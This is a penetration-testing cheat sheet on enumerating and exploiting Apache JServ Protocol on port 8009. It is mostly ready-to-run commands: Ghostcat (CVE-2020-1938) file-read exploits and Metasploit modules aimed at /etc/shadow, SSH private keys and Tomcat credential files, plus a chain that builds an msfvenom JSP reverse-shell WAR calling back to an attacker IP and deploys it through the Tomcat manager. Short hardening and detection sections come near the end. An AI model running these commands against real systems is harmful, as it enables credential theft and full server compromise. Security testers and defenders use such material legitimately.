# AJP (APACHE JSERV PROTOCOL) ENUMERATION (Port 8009)

## SERVICE OVERVIEW
```
AJP (Apache JServ Protocol) is a binary protocol for communication
- Connects Apache HTTP Server to Tomcat
- Default port: 8009 (but can be configured)
- Binary protocol (not HTTP)
- Used for reverse proxy communication
- Not designed for direct client access
- Often misconfigured and exposed
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p8009 <IP>                             # Service/Version detection
nc -nv <IP> 8009                                 # Manual connection (binary data)
```

## BASIC ENUMERATION
```bash
# Nmap scripts
nmap -p8009 --script ajp-auth <IP>               # Check authentication
nmap -p8009 --script ajp-methods <IP>            # Enumerate HTTP methods
nmap -p8009 --script ajp-request <IP>            # Send AJP request
nmap -p8009 --script ajp-brute <IP>              # Brute force (if exists)

# Nmap full scan
nmap -sV -p8009 --script "ajp-*" <IP>
```

## AJP REQUEST TESTING
```bash
# Use Nmap to send AJP requests
nmap -p8009 --script ajp-request --script-args ajp-request.path=/ <IP>
nmap -p8009 --script ajp-request --script-args ajp-request.path=/manager/html <IP>
nmap -p8009 --script ajp-request --script-args ajp-request.path=/admin <IP>

# Get page content via AJP
nmap -p8009 --script ajp-request --script-args ajp-request.path=/,ajp-request.method=GET <IP>
```

## GHOSTCAT VULNERABILITY (CVE-2020-1938)
```bash
# Critical vulnerability in Tomcat AJP
# Allows reading files from Tomcat server
# Affects Tomcat 9.x < 9.0.31, 8.x < 8.5.51, 7.x < 7.0.100

# Test for Ghostcat
nmap -p8009 --script ajp-request --script-args ajp-request.method=READ,ajp-request.path=/WEB-INF/web.xml <IP>

# Using Python exploit
git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi.git
python CNVD-2020-10487-Tomcat-Ajp-lfi.py <IP> -p 8009 -f /WEB-INF/web.xml

# Read sensitive files
python CNVD-2020-10487-Tomcat-Ajp-lfi.py <IP> -p 8009 -f /WEB-INF/web.xml
python CNVD-2020-10487-Tomcat-Ajp-lfi.py <IP> -p 8009 -f /WEB-INF/classes/db.properties
python CNVD-2020-10487-Tomcat-Ajp-lfi.py <IP> -p 8009 -f /etc/passwd
python CNVD-2020-10487-Tomcat-Ajp-lfi.py <IP> -p 8009 -f /etc/shadow

# Alternative Ghostcat exploit
searchsploit Ghostcat
searchsploit CVE-2020-1938
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/admin/http/tomcat_ghostcat         # Ghostcat LFI
set RHOSTS <IP>
set RPORT 8009
set FILENAME /WEB-INF/web.xml
run

# Read multiple files
set FILENAME /etc/passwd
run
set FILENAME /WEB-INF/classes/application.properties
run

# Try for RCE (upload file via AJP)
use exploit/multi/http/tomcat_ajp_file_read      # File read
use exploit/windows/http/tomcat_cgi_cmdlineargs  # CGI RCE (if applicable)
```

## SENSITIVE FILES TO READ (Ghostcat)
```bash
# Tomcat configuration files
/WEB-INF/web.xml                                 # Application configuration
/WEB-INF/classes/application.properties          # Spring Boot properties
/WEB-INF/classes/db.properties                   # Database credentials
/WEB-INF/classes/config.properties               # General configuration
/META-INF/context.xml                            # Tomcat context config
/META-INF/maven/*/*/pom.xml                      # Maven project info

# System files (Linux)
/etc/passwd                                      # User accounts
/etc/shadow                                      # Password hashes
/root/.ssh/id_rsa                                # Root SSH key
/home/tomcat/.bash_history                       # Command history
/var/log/tomcat/catalina.out                     # Tomcat logs

# System files (Windows)
c:/windows/system32/drivers/etc/hosts            # Hosts file
c:/tomcat/conf/tomcat-users.xml                  # Tomcat users
c:/tomcat/conf/server.xml                        # Server config
```

## ACCESSING WEB APPLICATION THROUGH AJP
```bash
# Use nginx or Apache as AJP proxy
# Apache configuration:
<VirtualHost *:80>
    ProxyPass / ajp://<IP>:8009/
    ProxyPassReverse / ajp://<IP>:8009/
</VirtualHost>

# Then access via HTTP:
curl http://localhost/
curl http://localhost/manager/html
curl http://localhost/admin

# Nginx configuration:
location / {
    ajp_pass <IP>:8009;
}
```

## APACHE MOD_JK CONNECTOR
```bash
# If Apache uses mod_jk to connect to Tomcat via AJP
# Check for workers.properties or mod-jk.conf

# Common paths:
curl http://<IP>/jkstatus                        # JK status page
curl http://<IP>/jk-status                       # Alternative
curl http://<IP>/jkmanager                       # JK manager

# Information disclosure
curl http://<IP>/jkstatus?mime=prop              # Properties format
```

## VULNERABILITY SCANNING
```bash
# Search for AJP/Tomcat vulnerabilities
searchsploit ajp
searchsploit "apache jserv"
searchsploit "tomcat ajp"

# Known vulnerabilities:
# CVE-2020-1938: Ghostcat (LFI/RCE)
# CVE-2020-1745: AJP request smuggling
# CVE-2020-13943: Tomcat AJP

# Scan with Nmap
nmap -p8009 --script vuln <IP>
```

## REQUEST SMUGGLING
```bash
# AJP request smuggling (CVE-2020-1745)
# Craft malicious AJP packets to bypass security controls
# Requires deep protocol knowledge

# Check if vulnerable
searchsploit CVE-2020-1745
# Use specialized tools or Metasploit modules
```

## ENUMERATION VIA AJP
```bash
# Enumerate directories/files via AJP
nmap -p8009 --script ajp-request --script-args ajp-request.path=/admin <IP>
nmap -p8009 --script ajp-request --script-args ajp-request.path=/manager <IP>
nmap -p8009 --script ajp-request --script-args ajp-request.path=/examples <IP>

# Brute force paths
for path in / /admin /manager /console /dashboard /api /test; do
    echo "Testing: $path"
    nmap -p8009 --script ajp-request --script-args ajp-request.path=$path <IP> 2>/dev/null | grep -i "200\|302"
done
```

## INTERESTING CONFIGURATION FILES
```bash
# Tomcat configuration
/opt/tomcat/conf/server.xml                      # AJP connector config
/usr/local/tomcat/conf/server.xml
/var/lib/tomcat/conf/server.xml

# AJP connector in server.xml:
<Connector port="8009" protocol="AJP/1.3" redirectPort="8443" />

# If secretRequired="false" or no secret:
# Server is vulnerable to unauthorized AJP connections

# Check for:
<Connector port="8009" protocol="AJP/1.3" secretRequired="false" />
# This allows anyone to connect via AJP!
```

## COMMON MISCONFIGURATIONS
```
☐ AJP port exposed to internet                  # Should be internal only
☐ secretRequired="false"                        # No authentication required
☐ No secret attribute set                       # Default config, no auth
☐ Vulnerable Tomcat version                      # Ghostcat (CVE-2020-1938)
☐ No IP restrictions                             # Anyone can connect
☐ allowedRequestAttributesPattern misconfigured  # Request smuggling possible
☐ Files readable via Ghostcat                   # LFI vulnerability
☐ No monitoring/logging                          # Attacks undetected
☐ Running as root/Administrator                  # Privilege escalation
```

## QUICK WIN CHECKLIST
```
☐ Check if port 8009 is accessible from internet
☐ Test for Ghostcat (CVE-2020-1938)
☐ Attempt to read /WEB-INF/web.xml
☐ Try to read sensitive configuration files
☐ Check Tomcat version for known vulnerabilities
☐ Attempt to read /etc/passwd or similar
☐ Look for database credentials in config files
☐ Test request smuggling vulnerabilities
☐ Enumerate web application paths
☐ Check for SSH keys or credentials
```

## ONE-LINER FULL ENUMERATION
```bash
# Comprehensive AJP scan
nmap -sV -p8009 --script "ajp-*" -oA ajp_enum <IP>

# Quick Ghostcat test
nmap -p8009 --script ajp-request --script-args ajp-request.method=READ,ajp-request.path=/WEB-INF/web.xml <IP>
```

## POST-EXPLOITATION (After Ghostcat LFI)
```bash
# Read web.xml for application structure
python ghostcat.py <IP> -f /WEB-INF/web.xml

# Extract database credentials
python ghostcat.py <IP> -f /WEB-INF/classes/application.properties
python ghostcat.py <IP> -f /WEB-INF/classes/db.properties

# Read Tomcat users (for manager access)
python ghostcat.py <IP> -f /conf/tomcat-users.xml
python ghostcat.py <IP> -f /usr/local/tomcat/conf/tomcat-users.xml

# Get SSH keys
python ghostcat.py <IP> -f /root/.ssh/id_rsa
python ghostcat.py <IP> -f /home/tomcat/.ssh/id_rsa

# Read application source code
python ghostcat.py <IP> -f /WEB-INF/classes/com/company/Application.class

# After getting credentials, access Tomcat manager
# Deploy malicious WAR file for RCE
```

## RCE VIA GHOSTCAT + TOMCAT MANAGER
```bash
# 1. Use Ghostcat to read tomcat-users.xml
python ghostcat.py <IP> -f /conf/tomcat-users.xml

# 2. Extract credentials, e.g.:
# <user username="admin" password="password123" roles="manager-gui,admin-gui"/>

# 3. Access Tomcat manager (usually on port 8080)
curl -u admin:password123 http://<IP>:8080/manager/html

# 4. Deploy malicious WAR file
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_IP> LPORT=4444 -f war > shell.war
curl -u admin:password123 --upload-file shell.war http://<IP>:8080/manager/text/deploy?path=/shell

# 5. Trigger shell
curl http://<IP>:8080/shell/
```

## DETECTION & PREVENTION
```bash
# Secure AJP configuration (server.xml):
<Connector port="8009" protocol="AJP/1.3"
           secretRequired="true"
           secret="your_random_secret_here"
           address="127.0.0.1" />

# Best practices:
1. Bind AJP to localhost only (address="127.0.0.1")
2. Enable secretRequired="true"
3. Set strong secret attribute
4. Update Tomcat to latest version
5. Use firewall to block external access to 8009
6. Monitor AJP connections
7. Disable AJP if not needed
```

## SECURITY IMPLICATIONS
```
CRITICAL RISKS:
1. Port 8009 exposed to internet: immediate vulnerability
2. Ghostcat (CVE-2020-1938): arbitrary file read
3. Can read application config files
4. Can extract database credentials
5. Can read SSH keys
6. Can lead to full system compromise
7. Request smuggling possible
8. Often leads to Tomcat manager access
9. Binary protocol - harder to monitor

RECOMMENDATION:
- AJP should NEVER be internet-accessible
- Update Tomcat immediately
- Enable secretRequired with strong secret
- Bind to 127.0.0.1 only
- If found during pentest, report as CRITICAL
```

## ADVANCED TECHNIQUES
```bash
# Chain Ghostcat with other vulnerabilities
# 1. Use Ghostcat to read credentials
# 2. Access Tomcat manager
# 3. Deploy malicious WAR
# 4. Get reverse shell
# 5. Privilege escalation

# Extract secrets from config files
# Look for:
# - Database passwords
# - API keys
# - JWT secrets
# - Encryption keys
# - LDAP credentials
# - Email passwords
```
